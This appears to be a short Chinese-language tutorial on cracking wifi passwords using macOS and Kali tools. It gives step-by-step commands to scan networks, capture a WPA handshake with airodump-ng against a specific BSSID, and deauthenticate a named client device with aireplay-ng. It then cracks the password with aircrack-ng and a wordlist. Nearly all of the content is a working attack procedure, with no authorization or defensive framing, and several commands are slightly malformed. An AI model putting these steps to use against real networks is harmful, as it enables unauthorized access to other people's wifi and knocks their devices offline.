# MacOS+kali 破解wifi

## 1.扫描wifi信号获取mac ssid 及频段, 找到要破解的wifi信号

```
 x mac wifi scan
```
 或者

```
m  wifi scan
```

## 2.开启mac监听模式

1.鼠标快捷键 ALT 按住 + Wifi图标
2.打开无线诊断    ----> 或者手动打开无线诊断应用,可以忽略1、2步
3.不要直接继续,点击菜单栏“窗口”->“嗅探器(Sniffer)”->“设置频道:48、宽度:80MHz”->开始



## 3.查看设备终端握手包

-c 11 选择11号频道
-bssid 目标mac地址,wifi BSSID地址
-w /home/lingdu/桌面 /handshake 保存握手包到桌面



```
airodump-ng -c 11 bssid 60:32:B1:56:3F:B2 -w /home/lingdu/桌面 /handshake wlan0
```

## 3.发送重连wifi信号,ACK死亡攻击,利用wifi重连机制

-0 设备断开设备,下线
10 攻击次数
-a 目标mac地址,wifi BSSID地址
-c 踢下线目标设备
wlan0 wifi接口



```
aireplay-ng -0 10 -a 60:32:B1:56:3F:B2 -c CC:08:FB:DD:42:18 wlan0

```
## 查看wifi设备

```
networksetup -listallhardwareports
```

## 破解wifi密码

```
aircrack-ng -w 桌面/p.txt 桌面/2.pcap
```
